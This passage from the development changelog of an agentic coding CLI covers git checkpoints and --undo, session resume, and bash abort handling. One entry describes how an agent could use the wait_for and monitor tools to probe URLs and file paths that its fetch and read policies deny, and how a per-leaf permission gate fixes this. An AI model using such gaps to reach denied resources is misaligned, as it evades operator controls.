preservation commit with the same temp-index/commit-tree mechanism
`snapshot()` uses, anchor it under `refs/agent/restore-saved/<ms>`,
and report the ref to the caller via the new `stashKind:
'agent-ref' | 'git-stash'` field on `RestoreResult`. The CLI
renders the right recovery hint:

  - `git-stash` → "Run `git stash pop` to recover the changes…"
  - `agent-ref` → "Run `git read-tree --reset -u <ref>` to
    recover the changes (HEAD is unborn; `git stash pop` would
    fail)."

**Index re-sync** (`read-tree HEAD` after the reset) is also
gated on `headAfter !== null`. Was already correct; comment
updated to call out the unborn case explicitly.

**Tests:** unit test reproduces the bug pre-fix (the previous
"You do not have the initial commit yet" exit). New tests cover:
unborn-HEAD dirty restore (preservation ref captures the user's
version, working tree gets the checkpoint), unborn-HEAD clean
restore (no preservation), and the CLI recovery-hint variant
(matches `git read-tree --reset -u`, NOT `Run \`git stash pop\``).

**Verification:** `bun test` 1053 pass / 10 skip / 0 fail (+3 new
tests for unborn-HEAD paths); `tsc --noEmit` clean; `biome
check` clean. Bench + smoke from the previous pass still green.

---

## [2026-04-29] M3 / Step 3 — closes acceptance criteria 6+7

`CHECKPOINTS.md §5` listed 8 acceptance criteria. The mock-driven
test suite covered 1–5 + 8; criteria 6 (real-model smoke) and 7
(perf in 10k-file repo) were the difference between "code that
passes mocks" and "subsystem we know works". This pass lands both.

**Critério 7 — performance bench.**

`evals/bench-checkpoint-snapshot.ts` synthesizes a temp git repo
with 10k small files (configurable via `--files`), seeds an
initial commit, and runs the production `snapshot()` 100 times,
mutating one file per iteration so write-tree has real work
(skip-on-noop is rejected as an invalid measurement). One
warm-up round discarded to keep page-cache + JIT off the timing
distribution.

Result on dev box (ext4, NVMe, ~10k files):
  min   111.57ms
  p50   117.13ms
  mean  117.97ms
  p95   124.04ms
  p99   137.04ms
  max   149.45ms

SLO is `p95 < 500ms` per CHECKPOINTS §2.8. We're at 124ms — 4×
headroom. The bench is shape-stable enough to drop into a CI
gate later (cost: $0, no API).

**Critério 6 — real-model smoke.**

`evals/smoke-checkpoint-undo.sh` mirrors the smoke-resume pattern:
- mktemp workspace, isolated XDG, fresh `git init`
- bypass-mode `.agent/permissions.yaml` so write_file isn't policy-denied
- 3 seed files, sha-256-captured pre-edit
- agent prompt asking Claude Haiku to prepend a header line to all
  three via write_file
- assert: at least one `checkpoint_created` event AND at least one
  file changed (proves the agent did the work)
- `--undo --yes <sessionId>`
- assert: each file's sha-256 matches the pre-edit capture, byte-
  for-byte

Cost: ~$0.005-0.02 per run on Haiku 4.5.

**Bug surfaced by the smoke (and fixed):**

`src/cli/index.ts` had a top-level "missing prompt" gate that
exempted `--list-sessions` but not `--undo` / `--checkpoints`.
Running `--undo <session>` without a follow-up prompt errored
out with the help text instead of dispatching the lifecycle
verb. Mock tests didn't catch this — they call `run()` directly,
bypassing the entry. The smoke spawns the real binary path and
caught it on the first run.

Fix: extend the prompt-optional list to cover the two new
verbs. Tests in `tests/cli/index.test.ts` now exercise both
end-to-end through the spawned subprocess so the regression
can't sneak back via the `run()` shortcut.

**Why the smoke was load-bearing:**

The bug above is exactly the class of failure that mocks miss —
not a logic error in the checkpoint subsystem itself, but a
glue-layer mismatch between the CLI entry and the verb
dispatcher. Without the smoke, this would have shipped to a real
user as "agent --undo X gives me the help text". Worth the
~$0.01 tax to catch upfront.

**Step 3 status:** all 8 acceptance criteria of CHECKPOINTS §5
satisfied. Subsystem ships.

**Verification:** `bun test` 1050 pass / 10 skip / 0 fail (+2 new
tests for the prompt gate); `tsc --noEmit` clean; `biome check`
clean. `bun run evals/bench-checkpoint-snapshot.ts` exits 0
(p95=124ms). `./evals/smoke-checkpoint-undo.sh` exits 0 against
Haiku 4.5.

---

## [2026-04-29] M3 / Step 3 — review fixes (post-self-review pass)

Self-review surfaced 13 issues across the Step 3 surface — 3 critical
(C1–C3), 5 medium, and 5 minor. All addressed in this pass; the
checkpoints subsystem now has tighter subprocess hygiene, no
race-on-shutdown, and a metadata-driven escapesCwd flag.

**Critical:**

- **C1 — Race between fire-and-forget retention purge and `db.close`.**
  `cli/run.ts` closes the DB right after `runAgent` returns; the
  prior fire-and-forget purge could outlive the close and hit a
  closed sqlite handle (segfault risk depending on Bun's binding).
  Fix: capture the purge promise in the loop's outer scope and
  `await` it in the outer `finally` (with `.catch` swallow) before
  any other cleanup. The retention tests dropped their 50ms
  `setTimeout` polling — the purge now resolves synchronously by
  the time `runAgent` returns.
- **C2 — Spec §13 vs CHECKPOINTS.md divergence.** Spec §13 still
  declared the v0 columns (`ref`, `kind`, `files_changed`,
  `size_bytes`); the design doc CHECKPOINTS.md §2.4 already
  resolved the open question to (`git_ref`, `had_bash`) and the
  code followed §2.4. CLAUDE.md says diverging from spec requires
  a spec PR first — fixed by editing §13 to match (cascade FK,
  `had_bash` CHECK, comment pointing to §2.4 for the v0→v1
  motivation).
- **C3 — `restore()` could leave a stash orphan on a GC'd commit.**
  Old shape: stash dirty changes first, then `read-tree --reset
  -u <sha>` — if the sha was GC'd, the read-tree threw and the
  user got "Restored to checkpoint X" while their working tree
  was actually in stash@{0}. Fix: probe `rev-parse --verify
  <sha>^{commit}` BEFORE stashing. Test verifies dirty file
  stays in working tree when the sha is unreachable.

**Medium:**

- **M1 — Post-restore index now matches HEAD, not the checkpoint.**
  `read-tree --reset -u <ckpt>` rewrote both index and worktree
  to the checkpoint tree, leaving HEAD pointing past it. The
  user's `git status` then showed the diff between HEAD and the
  ckpt as "staged for commit" — confusing UX when they had their
  own commits during the agent run. Fix: after the reset, run
  `read-tree HEAD` (no -u) to re-sync the index. Status reads as
  the natural "unstaged changes vs HEAD" (or clean, when HEAD ==
  ckpt-tree). Test asserts `git status --porcelain` shows only
  untracked-file rows post-restore.
- **M2 — Orphan-ref sweep was O(N×M).** Per-ref
  `listCheckpointsBySession` lookup turned the cleanup into a
  quadratic walk for sessions with no rows but many refs.
  Replaced with one `SELECT DISTINCT session_id FROM checkpoints`
  and a Set lookup. Same correctness, linear.
- **M3 — `runGit` had no timeout and leaked subprocess on stdin
  failure.** Added a 30s default timeout (`RUN_GIT_DEFAULT_TIMEOUT_MS`,
  per-call override via `opts.timeoutMs`); a stuck git process
  (waiting on a ref lock from another git instance) now throws
  `git X timed out after Nms` instead of wedging the harness for
  the full wall-clock budget. Stdin write/end is wrapped in
  try/finally that kills the subprocess on error, closing the
  zombie-on-broken-pipe gap.
- **M4 — Manager opened its own `Bun.spawn` for `update-ref`.**
  Inconsistent with the rest of the surface (everything else
  goes through `runGit`). Exposed `setSessionRef(cwd, sessionId,
  sha)` in `git.ts` and the manager's purge re-pointing now
  uses it — same env scrubbing, same timeout, same auditable
  surface.
- **M5+m2 — Dead code + `path.dirname`.** `purge()`'s sessionId
  branch read `rows = listCheckpointsBySession` and discarded
  with `void rows;` (leftover from an earlier shape that wanted
  per-ref deletion); removed. `cleanupTempIndex` switched
  `join(indexFile, '..')` → `dirname(indexFile)` for clarity
  and platform-safety.

**Minor:**

- **m1 — `ToolMetadata.escapesCwd` flag with metadata-first
  detection.** `had_bash` was hardcoded to a name list (`bash`,
  `bash_background`, `bash_kill`); future tools with the same
  risk profile would silently miss the warning. Added optional
  `escapesCwd?: boolean` to ToolMetadata; the bash family opts
  in. The harness checks the flag first and falls back to the
  name list as defense in depth so external tool definitions
  that pre-date the flag still get the warning.
- **m3 — Friendly CLI message for GC'd ckpt commits.** `--undo`
  on a checkpoint whose commit was reclaimed by `git gc` used to
  surface raw git output (`fatal: bad object` /
  `Needed a single revision`). Rewrites detected via substring
  match into "this checkpoint references commit X which is no
  longer reachable; run `agent --checkpoints purge <session>` to
  drop the stale rows." Test seeds an unreachable sha and
  asserts the hint is on stderr.

**Verification:** `bun test` 1048 pass / 10 skip / 0 fail (+3 vs the
foundation pass: GC-collected restore hint, post-restore index
shape, restore-on-bad-sha leaves dirty intact); `tsc --noEmit`
clean; `biome check` clean. Retention tests dropped their
`setTimeout(50)` polling — the C1 await makes purge resolution
deterministic.

---

## [2026-04-29] M3 / Step 3 — Checkpoints + `--undo`

Lands `AGENTIC_CLI §12` + the `CHECKPOINTS.md` design doc:
every step that runs a tool with `metadata.writes === true`
produces a git-backed snapshot that `--undo` (or
`--checkpoints restore`) can revert to. Reversibility-by-design
(principle 10) finally has its load-bearing implementation.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/009-checkpoints.ts` | NEW | `checkpoints` table — id, session_id (FK CASCADE), step_id, git_ref, created_at, had_bash. Two indexes covering (session_id, created_at DESC) and (session_id, step_id) |
| `src/storage/repos/checkpoints.ts` | NEW | insert/get/listBySession/getLatest/delete/deleteBySession/listOlderThan. CASCADE-tested round-trip |
| `src/checkpoints/git.ts` | NEW | Low-level git plumbing — runGit wrapper (LC_ALL=C, GIT_TERMINAL_PROMPT=0), isGitRepo, getHeadSha, resolveRef, snapshot (temp index + commit-tree), restore (stash-on-dirty + read-tree --reset -u), diff (tree-vs-tree to cover untracked), listSessionRefs, deleteSessionRef |
| `src/checkpoints/detect.ts` | NEW | Soft probe: `available: boolean + reason` so the harness can wire a no-op manager when cwd isn't a git repo |
| `src/checkpoints/manager.ts` | NEW | `CheckpointManager` impl from CHECKPOINTS §3 — snapshot/list/get/restore/diff/purge. Purge handles per-session and per-age (default 30d) with orphan-ref sweep |
| `src/harness/loop.ts` | UPDATED | Optional manager creation behind `enableCheckpoints` flag. Snapshot fired before the per-step tool loop when any tool_use's metadata declares `writes:true`. `had_bash` derived by tool name (bash, bash_background, bash_kill). Lazy retention purge fired fire-and-forget at session start. New events: `checkpoint_created`, `checkpoints_unavailable` |
| `src/harness/types.ts` | UPDATED | `enableCheckpoints?: boolean` (default false), `checkpointsRetentionDays?: number`, two new HarnessEvent variants |
| `src/cli/args.ts` | UPDATED | New flags: `--undo <session>`, `--checkpoints <verb> [positionals…]` (verbs: list/diff/restore/purge), `--yes` / `-y` for the bash-side-effect confirm |
| `src/cli/checkpoints.ts` | NEW | Standalone handler (no bootstrap, DB-only). All 5 verbs (list/diff/restore/purge + undo as latest-restore alias). Bash-warning gate refuses without `--yes`. Stash-on-dirty messaging on restore. JSON + table formats |
| `src/cli/run.ts` | UPDATED | Dispatches `--undo` / `--checkpoints` short-circuit before bootstrap (mirroring `--list-sessions`). Mutually exclusive with `--resume` by ordering |
| `src/cli/bootstrap.ts` | UPDATED | Real CLI runs default `enableCheckpoints: input.plan !== true`. Plan mode opts out (no writes can land ⇒ nothing to undo) |
| Tests | NEW | `tests/storage/checkpoints.test.ts` (10), `tests/checkpoints/git.test.ts` (21), `tests/checkpoints/detect.test.ts` (2), `tests/checkpoints/manager.test.ts` (14), `tests/harness/checkpoints.test.ts` (10 — wiring + retention sweep), `tests/cli/checkpoints.test.ts` (15 — verbs, JSON shape, bash gate, cross-session refusal), `tests/cli/args.test.ts` (+11 — new flag parsing) |

**Decisions:**

- **Ref shape: linear chain per session under `refs/agent/checkpoints/<session>`.** Each new snapshot's parent is the prior session checkpoint (or HEAD on the first), so the whole history stays reachable from one ref. We update the ref only on a successful new commit; the prior chain stays intact via parent links, and the DB row is the authoritative pointer when we need to walk back. NOT `refs/stash` — would pollute the user's stash list and is one-stack-only.
- **Snapshot via temp index + `commit-tree`, NOT `git stash create`.** stash-create can't pick parents (always HEAD). Our chain shape requires parent-on-prior-checkpoint, so we use the lower primitive: `GIT_INDEX_FILE=tmp git read-tree HEAD; git add -A; git write-tree; commit-tree <tree> -p <prior>`. The user's `.git/index` is never touched.
- **No-op skip uses tree-equality vs prior parent.** When the working tree's `write-tree` matches the prior chain head's tree, we return `sha=null` and the harness writes no row. Defense in depth: a tool that lies about `writes:true` won't pollute the audit trail.
- **`had_bash` derived by tool name, not metadata.** The bash family (`bash`, `bash_background`, `bash_kill`) is the only group whose side effects escape cwd reversibility (DB writes, network, processes). Hardcoding by name keeps the rule auditable; adding a new bash-shaped tool is an explicit edit, not an emergent metadata interaction.
- **CLI surfaces are headless-first.** `--yes` / `-y` replaces the spec's interactive `Type 'undo' to confirm` prompt. Real interactive confirm waits for the M4 Ink TUI; pre-TUI the operator runs without `-y`, sees the warning, decides, re-runs with `-y`. JSON shape preserved on every verb so eval harnesses and audit consumers can parse.
- **`session_start` precedes `checkpoints_unavailable`.** Renderers that bracket on `session_start` would otherwise miss the warning. We capture the unavailability flag before session_start and emit it right after, preserving the bracket contract.
- **Diff uses tree-vs-tree.** `git diff <ckpt-sha>` only sees tracked files; an untracked file added since the snapshot would silently disappear from the diff. We materialize the working tree as an ephemeral commit object via the same temp-index technique and diff `<ckpt-tree>` against `<wt-tree>`. Slightly slower than the naive form, correct on all input shapes.
- **Lazy retention sweep is fire-and-forget at session_start.** A monorepo with thousands of refs could spend seconds in `update-ref -d`; blocking the harness on cleanup defeats the spec's "non-blocking, best-effort" wording. Errors are swallowed so a corrupt ref store doesn't bring down a session for cleanup that can be retried next run. Safe under concurrent snapshots: the cutoff is `now - retentionDays`, well behind any in-flight session's `created_at`.
- **`--undo` resolves latest internally rather than requiring `--checkpoints restore <session> <latest>`.** Matches CHECKPOINTS §2.3 word-for-word and is the dominant case. Implemented as a thin alias over `restore` so the bash-warning + stash logic is shared.
- **Plan mode disables the subsystem.** Saves one git probe per `--plan` invocation and avoids confusion about why an undo would be empty (no writes ran). Spec §12.4 documents the relationship between plan + checkpoints; the implementation makes them orthogonal at construction time.

**Pending (M4 / later):**

- Slash commands `/undo`, `/checkpoint list/restore/diff/purge` — wait on M4 Ink TUI; same internal API consumed.
- Interactive `Type 'undo' to confirm` prompt — also TUI-bound.
- `cp --reflink` fallback for non-git directories — deferred per CHECKPOINTS §4. Pull-in signal: a user explicitly asks while in a non-git workspace.
- Time-based auto-snapshots and branching/forking from a checkpoint — out of scope per CHECKPOINTS §4.
- Performance smoke against a 10k-file repo (CHECKPOINTS §5 criterion 7). Manual verification today; bundle with the eval-baseline pass when M3 closes.

**Why it matters:**

- "Reversível por design" (root principle 10) finally has the implementation that makes it true. Before this slice, every successful write tool was permanent.
- Unblocks the M4 TUI work that needs `/undo` semantics already in the engine — the slash command is just a wire to `runCheckpointsCli`.
- Eval / regression tooling can now restore between runs to keep the working tree in a known state without manual `git reset`.

**Verification:** `bun test` 1045 pass / 10 skip / 0 fail (+114 new tests across storage, checkpoints, harness, cli); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.4 — Resume + list-sessions (CLI)

Lands the non-UI half of spec §2.1 session continuity:
`agent --list-sessions` and `agent --resume <id|last>`. The
interactive picker (bare `--resume`, `/sessions *` slash
commands, mini-recap inline) waits for the M4 Ink TUI.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/cli/args.ts` | UPDATED | New flags `--list-sessions`, `--resume <id\|last>`. `--resume` requires a value (interactive picker is M4) |
| `src/cli/list-sessions.ts` | NEW | Standalone handler — opens DB, lists newest-first, prints table or NDJSON. Skips bootstrap entirely (no API key needed) |
| `src/cli/run.ts` | UPDATED | Dispatch on flags: list-sessions short-circuit, resume id/`last` resolution before bootstrap, validation that prompt is non-empty for resume |
| `src/cli/bootstrap.ts` | UPDATED | Plumbs `resumeFromSessionId` to HarnessConfig |
| `src/storage/repos/sessions.ts` | UPDATED | New `reopenSession(db, id)` flips status='running', clears endedAt — needed because completeSession's WHERE guard requires running |
| `src/harness/types.ts` | UPDATED | `HarnessConfig.resumeFromSessionId` |
| `src/harness/resume.ts` | NEW | `messagesToProviderMessages` reconstitutes ProviderMessage[] from persisted Message rows. Skips role='tool' (forward-compat: not currently emitted) |
| `src/harness/loop.ts` | UPDATED | Init block forks: resume path uses existing id + reopenSession + listMessagesBySession, new-session path unchanged. New userPrompt is appended after history regardless |
| Tests | NEW | `tests/storage/sessions.test.ts` (+3 reopenSession), `tests/harness/resume.test.ts` (4 cases), `tests/cli/list-sessions.test.ts` (7 cases), `tests/cli/resume.test.ts` (7 e2e cases incl. resume by id, resume 'last', empty session list, missing prompt, unknown id, status round-trip done→running→done) |

**Decisions:**

- **`--resume` requires a value (id or `last`).** Bare `--resume`
  for picker waits for the TUI. Falling back to a CLI prompt
  selector would be its own UX problem (number-of-rows? formatting
  in pipes?) — defer cleanly.
- **`last` is resolved BEFORE bootstrap.** Run.ts opens a temporary
  DB just to resolve, validates the id exists, then passes the
  concrete id through. Trade: one extra DB-open per resume call
  (cheap, sqlite is memory-mapped); benefit: typo'd id fails fast
  with a clean errSink message instead of an `internalError` exit
  with no diagnostic.
- **Resume requires a non-empty prompt.** Without one, the model
  would just see its own last assistant message replayed — no new
  turn. Cleaner to error than to loop on degenerate input.
- **bg processes are NOT carried over.** The previous run
  terminated them in its outer finally; resume starts with a fresh
  bg manager. Documented as a deliberate boundary in the loop
  comment — resume restores conversation, not running children.
- **Skipping role='tool' messages on reconstitution.** The schema
  has the slot but the loop never persists it (tool results are
  wrapped in user-role messages). Defensive skip if a future
  migration changes this — the resume reconstitution would just
  drop role=tool until the helper is updated.
- **`reopenSession` is idempotent.** Calling on an already-running
  session is a no-op (UPDATE with WHERE id=?). Calling on an
  unknown id throws. Tests cover both.
- **No bootstrap dependency for `--list-sessions`.** Inspecting
  prior runs shouldn't require an API key or a parsable
  `permissions.yaml`. The handler opens DB + migrates + queries +
  closes, that's it.

**Pending (M4 / later):**

- Interactive picker (bare `--resume`) — needs Ink TUI.
- `/sessions list/show/switch` slash commands — needs TUI command
  surface.
- Mini-recap inline in the listing — Recap subsystem (M4).
- `--replay` for debug/eval — separate step.
- Worktree-aware filtering on resume (warn if cwd diverged
  between original session and resume).

**Why it matters:**

- Closes the most-asked-for non-UI feature: "I ran something
  yesterday, let me continue that thread."
- Unblocks downstream eval flows that need stable session ids
  for replay.
- Demonstrates the storage layer round-trips messages cleanly
  (the resume helper is the first non-trivial reader of the
  persisted message log).

**Verification:** `bun test` 931 pass / 10 skip / 0 fail (+27 new
tests across cli, storage, harness); `tsc --noEmit` clean;
`biome check` clean.

---

## [2026-04-29] M3 / Step 2.3 — todo_write tool

Lands the TodoList primitive from spec §7.4. The model uses
`todo_write(items)` to make sub-task progress visible during
multi-step work; the live checklist landing in the TUI is M4
(Ink), but the storage and tool surface are usable today via
audit logs.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/todo/index.ts` | NEW | In-memory `TodoStore` keyed by sessionId; per-spec NOT persisted. Defensive copies on get/set so callers can't mutate stored state |
| `src/tools/builtin/todo-write.ts` | NEW | Tool with snake_case surface (active_form), runtime validation parity, single-in_progress enforcement |
| `ToolContext.todoStore` | UPDATED | Optional `TodoStore` field, parallel to bgManager. Tool surfaces `todo.store_unavailable` if absent |
| Harness wiring | UPDATED | Loop creates store at session start, clears on session end. Same lifecycle pattern as bgManager |
| Tool registry | UPDATED | Registered in `BUILTIN_TOOLS`; sits with read-only group |
| Tests | NEW | `tests/todo/store.test.ts` (8 cases) + `tests/tools/todo-write.test.ts` (14 cases) |

**Decisions:**

- **In-memory only.** Spec §7.4 is explicit: "Não persiste entre
  sessões — é estado de trabalho, não memória." No SQLite repo,
  no audit table. The only persistence surface is the tool_call
  audit row that records each `todo_write` invocation with its
  args (the standard mechanism for every tool).
- **At-most-one in_progress enforced at write time.** Spec calls
  this out as the right shape. The tool returns
  `tool.invalid_arg` if the model passes >1 in_progress so the
  bug is corrected at write time rather than ambiguously
  rendered. Cheap to enforce here; expensive to chase at render
  time later.
- **Atomic replacement, no merge.** The model passes the full
  intended list every call. Simpler API surface, no partial-
  update edge cases. Empty array clears the list.
- **Defensive copies on both get and set.** The store is the
  single owner of mutation; callers never get a reference to the
  internal array. Same pattern protects against accidental
  reference-leak bugs that would otherwise let a tool mutate
  state without going through `set()`.
- **Snake_case at the tool boundary, camelCase internally.**
  `active_form` ↔ `activeForm`. Manual conversion at the seam
  (not via keysToSnake) because the inbound direction also
  needs translation; the helper only goes one way today.

**Why it matters:**

- Implements spec §7.4 literally — no scope creep, no daemons,
  no cross-session memory.
- Validation parity follows the playbook §3.3 pattern
  established across the rest of the tool surface this branch.
- Eval scoring (spec §16) can now reward `todo_write` use on
  tasks of 5+ steps as planned in `eval.scoring.todo_used`.

**Pending:**

- Live checklist render in the TUI — M4 (Ink). The store +
  audit log already let a renderer display the current list at
  any point.
- Eval cases that reward TodoList usage on multi-step tasks —
  follow-up to the regression eval batch.

**Verification:** `bun test` 895 pass / 10 skip / 0 fail (+22 new
tests across todo store + tool); `tsc --noEmit` clean;
`biome check` clean.

---

## [2026-04-29] hardening: bash tool abort handling + SIGKILL escalation

Surface-level claim corrected by evidence. Initial analysis said
"`ctx.signal` doesn't thread to bash subprocess during exec" — a
quick standalone test (`bun run` calling `Bun.spawn` with
`signal: ctrl.signal`) showed Bun honors signal natively and kills
in ~100ms with SIGTERM. Lesson: don't claim a gap by reading code
alone; verify with a runnable repro. Logged as a meta-lesson
worth folding into CODER_PLAYBOOK §6 (test completeness).

**Real gaps that DID exist:**

1. **No SIGKILL escalation.** Bun.spawn's signal handler sends
   SIGTERM only. A child with `trap "" TERM` (or any unresponsive
   process) would survive caller abort indefinitely.
2. **Misleading terminal classification.** When ctx.signal aborted
   mid-exec, the tool returned `{ exit_code: 143, timed_out: false }`
   — looking like a successful run that returned 143. The model
   would mis-route on this, treating cancellation as a result.
3. **Orphaned-children pipe block.** When `bash` itself dies but
   spawned a child holding stdout (e.g. `bash -c 'sleep 60 &'`),
   the orphan keeps the pipe fd open. Stream reads block until the
   orphan exits naturally — abort returns ~60s late despite the
   bash process being long dead.

**Fix:**

- `src/tools/builtin/bash.ts` — explicit abort listener on
  `ctx.signal` schedules a SIGKILL fallback after 5s grace
  (mirrors `bg/manager`'s `DEFAULT_KILL_GRACE_MS`). The timeout
  path keeps its existing 2s grace (timeouts are already a "ran
  too long" signal — no reason to extend).
- After exec, if `ctx.signal.aborted` was observed during the
  call, return `tool.aborted` instead of letting the bare
  `exit_code` slip through. Audit log + model both see the
  cancellation explicitly.
- `readCapped` accepts an optional `stopSignal`. The bash tool
  fires it via `proc.exited.then(() => readStopAc.abort())` so
  pending stream reads cancel as soon as the bash process itself
  dies, not when orphaned children eventually release the pipe.

**Tests:**

- `caller abort mid-exec returns tool.aborted` — abort during
  `sleep 5`, asserts elapsed < 1s and error_code === 'tool.aborted'.
- `SIGKILL escalation when child ignores SIGTERM (timeout path)` —
  `trap "" TERM; while true; do sleep 0.1; done` with timeout=200ms;
  asserts elapsed in [2s, 4s] window, proving SIGKILL fired after
  the 2s grace (without escalation, would hang forever).

**Verification:** `bun test` 843 pass / 7 skip / 0 fail (+2 new
tests); `tsc --noEmit` clean; `biome check` clean.

**Removed from TODO.md** (`bash tool: thread ctx.signal to the
running subprocess` — done, not deferred).

---

## [2026-04-29] M3 / Step 2.2 — defense-in-depth: wait/monitor wall-clock cap

After the security review that produced the per-leaf policy gate,
walked the recommended hardening list. Findings recorded here.

**Done — wait_for / monitor wall-clock cap (30min):**

The harness's `maxWallClockMs` (default 10min) is the canonical
upper bound on any tool, but operators that bump the harness cap
for long-running builds re-open the gap: a model declaring
`timeout_ms: 86400000` (24h) under a generous harness cap would
pin a tool slot for the full window. Per-tool cap of 30min is
generous for any real probe (build watches, dev-server readiness,
slow integration paths) and conservative against the pathological
case.

- `src/tools/builtin/wait-for.ts` — `MAX_WAIT_MS = 30 * 60 * 1000`
  enforced on `args.timeout_ms` AND on `sleep`'s `duration_ms`
  (otherwise `sleep` is bounded only by `timeout_ms`, which now
  has the cap, but the explicit check fails fast on a clearly
  bogus sleep).
- `src/tools/builtin/monitor.ts` — `MAX_DURATION_MS` mirrored
  on `args.duration_ms`.
- 3 regression tests added (one per site). Error messages cite
  "30min" so operators reading audit logs see the cap by name.

**Audited but no change needed:**

- `src/permissions/matcher.ts` — symlink resolution via
  `realpathSync` is ALREADY in place (lines 14-24), with a clean
  fallback for non-existent paths (realpath the parent + join
  basename). Test coverage in `tests/permissions/symlink.test.ts`.
  My initial security assessment underestimated this surface —
  defense-in-depth is stronger than I credited.
- `src/wait/monitor.ts:257,613` and `src/harness/loop.ts:229,287,384`
  — `X.fired ? 'X' : 'aborted'` patterns. These are 2-source
  binary decisions (duration timer / wall-clock timer vs caller
  signal). They do NOT have a third "deterministic no-match"
  terminal that the wait_for bug exhibited, so the same
  fall-through-aborted bug doesn't apply. Documented as audited
  in the playbook §2 follow-up.
- `src/tools/builtin/bash.ts` — `timedOut` flag is set explicitly
  by the timer, no ambiguity with caller abort. Separate gap:
  `ctx.signal.aborted` mid-exec doesn't thread to `proc.kill()`,
  so a harness-level abort during a long bash leaves the child
  running. Logged as a follow-up in TODO.md (out of scope here).

**Verification:** `bun test` 841 pass / 7 skip / 0 fail (+3 new
cap tests); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.2 — security fix: per-leaf policy gate on wait_for / monitor

**Bug:** `wait_for` and `monitor` are `category='misc'` (the harness's
`engine.check` returns `allow` for misc), but their leaf conditions
DO touch resources governed by existing policy sections:
- `file_exists` / `file_change` / `file_changes` — fs.read
  (`tools.read_file` allow_paths / deny_paths).
- `http_response` — web.fetch (`tools.fetch_url` allow_hosts /
  deny_hosts).
- `port_open` — same as above (host-based).

In a strict / locked deployment that configures
`tools.fetch_url` and `tools.read_file` to restrict access, a model
could still use `wait_for` to probe arbitrary internal URLs or
sensitive absolute paths, because no per-condition policy check
ran before execution. Identical exposure on `monitor`'s
`file_changes` condition.

**Fix:** the tools self-gate each leaf condition before dispatch.
- `ToolContext` adds an optional `permissionCheck(toolName,
  category, args) → Decision` predicate.
- The harness loop (`src/harness/loop.ts`) wires it as a thin
  delegate over `permissionEngine.check`.
- `src/tools/builtin/wait-for.ts` adds `checkLeafPolicies(cond,
  ctx)` that walks the (possibly composed) condition tree and
  calls the predicate per gated leaf:
    - `file_exists` / `file_change` → `(read_file, fs.read, {path})`
    - `http_response` → `(fetch_url, web.fetch, {url})`
    - `port_open` → `(fetch_url, web.fetch, {url: 'http://host:port'})`
      — synthesizes an http URL so the engine extracts the
      hostname for allow_hosts/deny_hosts matching. Port is
      informational; FetchPolicy is host-based today.
    - `process_exit` / `process_output` → NOT re-gated; the
      process was authorized at spawn time via tools.bash.
    - `sleep` → no gate (no resource access).
- `src/tools/builtin/monitor.ts` adds the same gate for
  `file_changes` (process_output_* leaves are not re-gated).
- New error code `permission.denied` (in `ERROR_CODES`) for
  leaf-level denies. Distinct from the harness-level deny
  (which uses `tool_decided` event).

**Decisions:**
- `confirm` decisions also block at leaves — the leaf has no UI
  surface to escalate a per-condition prompt. Operators that want
  a leaf-only confirm flow can configure deny rules instead.
- `permissionCheck` is REQUIRED on ToolContext (not optional).
  Initial cut made it optional with fall-through-allow to keep
  test changes minimal — but the same default-convenience
  anti-pattern documented in `CODER_PLAYBOOK §2.1` and §8 would
  silently re-introduce the bypass any time a future entrypoint
  constructs a ToolContext without going through the harness
  loop. Tightening to required forces type errors at every
  construction site (currently two: harness loop + test helper).
  The test helper provides a default allow-all predicate so
  non-gating tests stay terse; tests exercising deny paths
  override.
- Reuse existing policy sections (`tools.read_file`,
  `tools.fetch_url`) rather than introducing new wait_for /
  monitor sections — operators that already lock down read_file
  inherit the same allowlist for probes. Fewer dials to keep in
  sync.

**Done:**
- `src/tools/types.ts` — ToolContext.permissionCheck +
  ERROR_CODES.permissionDenied.
- `src/harness/loop.ts` — wires the callback.
- `src/tools/builtin/wait-for.ts` — checkLeafPolicies + call
  site before waitFor dispatch.
- `src/tools/builtin/monitor.ts` — checkLeafPolicy for
  file_changes.
- `tests/tools/_helpers.ts` — makeCtx now spreads
  permissionCheck overrides (was silently dropped before).
- `tests/tools/wait-for.test.ts` — 6 new tests covering deny on
  http_response / port_open / file_exists, composition deny,
  process_* skip, allow happy path.
- `tests/tools/monitor.test.ts` — 2 new tests for file_changes
  deny + process_output_lines skip.

**Why:** principle 6 (explicit trust) — when two policy sections
already encode operator intent for fs/network access, a third
tool that performs the same operations must respect those rules.
A "we'll add wait_for-specific rules later" approach drifts from
sibling parity (Coder Playbook §4.1).

**Verification:** `bun test` 838 pass / 7 skip / 0 fail (+8 new
tests); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] docs — Coder Playbook (`docs/CODER_PLAYBOOK.md`)

Consolidates the recurring bug patterns found across M2/M3 reviews
into a runtime knowledge artifact for the Forja agent (and humans
reviewing PRs).

**Source material:** every entry derives from a real bug fixed in
this repo's history — categorized by the post-mortem after Step 2.2
plus the three sibling-cancel / no-match-terminal fixes that landed
right after.

**Sections:**
1. Async control flow (Promise.all leaks, AbortSignal cascades,
   real-error-vs-synthetic-rejection in Promise.any).
2. Terminal classification (`aborted` is not the catch-all;
   distinct outcomes need distinct labels).
3. Concurrency on shared state (DB-level monotonic guards;
   transient overrides; runtime validation of schema constraints).
4. Sibling parity (validation, path resolution, convention seams,
   route-by-category).
5. Boundary handling (drain-before-end, overlap windows, bounded
   buffers).
6. Test completeness (assert the terminal label, not just the
   boolean; tests as regression markers).
7. Schema/SELECT discipline (column-add audit, `replace_all`
   pitfalls).
8. The meta-pattern (defaults that are convenient but wrong, and
   the audit reflex after N occurrences of the same class).

**Why a playbook and not just spec entries:** the spec describes
WHAT each subsystem does. The playbook describes HOW to write code
that doesn't regress the bugs we already paid for. Different
audience, different access pattern — the agent reads this when
deciding HOW to implement, not WHAT to implement.

**Pending:** none — file is self-contained. Future bug-class
discoveries should append a new entry to the matching section
rather than start a new doc.

---

## [2026-04-29] M3 / Step 2.2 — post-review fix: all_of sibling leak on sub-throw

Code review follow-up after Step 2.2 was reportedly closed. Single
🟡 bug found and fixed; symmetrical 🟢 issues documented as
deliberate decisions.

**Bug:** in `src/wait/index.ts`, `all_of` orchestration awaited
`Promise.all(tracked)` without intercepting rejections. When a
